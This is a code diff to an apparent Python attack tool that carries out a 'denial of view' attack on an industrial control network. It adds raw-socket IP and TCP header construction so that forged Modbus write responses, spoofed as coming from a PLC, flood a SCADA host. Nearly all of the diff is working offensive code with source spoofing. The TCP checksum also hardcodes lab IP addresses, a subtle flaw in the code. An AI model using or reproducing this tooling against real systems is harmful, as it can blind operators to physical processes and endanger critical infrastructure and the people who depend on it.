@@ -69,9 +69,80 @@ def build_forged_fc06_response(transaction_id: int, unit_id: int,
     return header + pdu
 
 
+def _build_ip_header(src_ip: str, dst_ip: str, payload_len: int) -> bytes:
+    """Build a minimal IPv4 header for raw TCP injection."""
+    import struct
+    version_ihl = (4 << 4) | 5  # IPv4, 5*4=20 bytes header
+    total_len = 20 + payload_len
+    identification = 0
+    flags_offset = 0x4000  # Don't Fragment
+    ttl = 64
+    protocol = 6  # TCP
+    checksum = 0
+    src = socket.inet_aton(src_ip)
+    dst = socket.inet_aton(dst_ip)
+    header = struct.pack(">BBHHHBBH4s4s",
+        version_ihl, 0, total_len, identification, flags_offset,
+        ttl, protocol, checksum, src, dst)
+    # Compute IP checksum
+    s = sum(struct.unpack("!10H", header))
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    checksum = ~s & 0xFFFF
+    header = struct.pack(">BBHHHBBH4s4s",
+        version_ihl, 0, total_len, identification, flags_offset,
+        ttl, protocol, checksum, src, dst)
+    return header
+
+
+def _build_tcp_header(src_port: int, dst_port: int, seq: int, ack: int,
+                       flags: int, payload: bytes) -> bytes:
+    """Build a minimal TCP header with data offset and checksum."""
+    import struct
+    data_offset = 5  # 5 * 4 = 20 bytes
+    window = 65535
+    checksum = 0
+    urgent = 0
+    header = struct.pack(">HHIIBBHHH",
+        src_port, dst_port, seq, ack,
+        (data_offset << 4) | flags, window, checksum, urgent)
+    # Pseudo-header for checksum
+    src_bytes = socket.inet_aton("10.0.0.66")  # attacker IP
+    dst_bytes = socket.inet_aton("10.0.0.10")  # SCADA IP
+    pseudo = struct.pack(">4s4sBBH", src_bytes, dst_bytes,
+                          0, 6, len(header) + len(payload))
+    s = sum(struct.unpack("!%dH" % ((len(pseudo) + len(header) + len(payload) + 1) // 2),
+             pseudo + header + payload + b'\x00'))
+    s = (s >> 16) + (s & 0xFFFF)
+    s += s >> 16
+    checksum = ~s & 0xFFFF
+    header = struct.pack(">HHIIBBHHH",
+        src_port, dst_port, seq, ack,
+        (data_offset << 4) | flags, window, checksum, urgent)
+    return header
+
+
+def _send_raw_tcp(sock, dst_ip: str, src_ip: str, dst_port: int, payload: bytes):
+    """Send a forged TCP packet with payload via raw socket."""
+    import struct
+    import random
+    src_port = random.randint(1024, 65535)
+    seq = random.randint(0, 2**32 - 1)
+    ack = 0
+    flags = 0x02  # SYN (but we just need to send data, use PSH|ACK)
+    flags = 0x18  # PSH | ACK
+    tcp_header = _build_tcp_header(src_port, dst_port, seq, ack, flags, payload)
+    ip_header = _build_ip_header(src_ip, dst_ip, len(tcp_header) + len(payload))
+    sock.sendto(ip_header + tcp_header + payload, (dst_ip, 0))
+
+
 def run_denial_of_view(scada_ip: str, plc_ip: str, port: int,
                        count: int, delay: float, log_path: Path) -> dict:
     """Flood the SCADA host with forged Modbus responses.
+
+    Uses raw sockets to inject forged FC06 responses directly to the
+    SCADA host without needing a TCP handshake (SCADA host doesn't
+    listen on port 502 as a server).
 
     Returns dict with stats.
     """
@@ -81,13 +152,29 @@ def run_denial_of_view(scada_ip: str, plc_ip: str, port: int,
     print(f"[denial_of_view] Forging responses as if from PLC at {plc_ip}")
     print(f"[denial_of_view] Sending {count} forged packets with {delay}s delay")
 
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(3.0)
+    try:
+        # Use raw socket to inject packets without TCP handshake
+        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
+        raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+        print(f"[denial_of_view] Raw socket created, injecting forged responses")
+    except OSError as e:
+        print(f"[denial_of_view] Raw socket failed (need root): {e}")
+        print(f"[denial_of_view] Falling back to TCP connect")
+        raw_sock = None
+
+    # Fallback: TCP connect (will fail if nothing listens on port 502)
+    tcp_sock = None
+    if raw_sock is None:
+        try:
+            tcp_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            tcp_sock.settimeout(3.0)
+            tcp_sock.connect((scada_ip, port))
+            print(f"[denial_of_view] Connected to SCADA host via TCP")
+        except OSError as e:
+            print(f"[denial_of_view] TCP connect failed: {e}")
+            return stats
 
     try:
-        sock.connect((scada_ip, port))
-        print(f"[denial_of_view] Connected to SCADA host")
-
         for i in range(count):
             tx_id = (i % 65536) + 1
             unit_id = 1
@@ -99,20 +186,16 @@ def run_denial_of_view(scada_ip: str, plc_ip: str, port: int,
             forged = build_forged_fc06_response(tx_id, unit_id, reg_addr, value)
 
             try:
-                sock.sendall(forged)
+                if raw_sock:
+                    # Build IP+TCP headers for raw injection
+                    _send_raw_tcp(raw_sock, scada_ip, plc_ip, port, forged)
+                else:
+                    tcp_sock.sendall(forged)
                 stats["packets_sent"] += 1
             except (socket.timeout, OSError) as exc:
                 stats["errors"] += 1
                 if stats["errors"] <= 3:
                     print(f"[denial_of_view] Send error on packet {i}: {exc}")
-                    # Reconnect if socket dropped
-                    try:
-                        sock.close()
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(3.0)
-                        sock.connect((scada_ip, port))
-                    except OSError:
-                        break
 
             if delay > 0:
                 time.sleep(delay)
@@ -124,7 +207,10 @@ def run_denial_of_view(scada_ip: str, plc_ip: str, port: int,
         print(f"[denial_of_view] Connection error: {exc}")
         stats["errors"] += 1
     finally:
-        sock.close()
+        if raw_sock:
+            raw_sock.close()
+        if tcp_sock:
+            tcp_sock.close()
 
     return stats
 
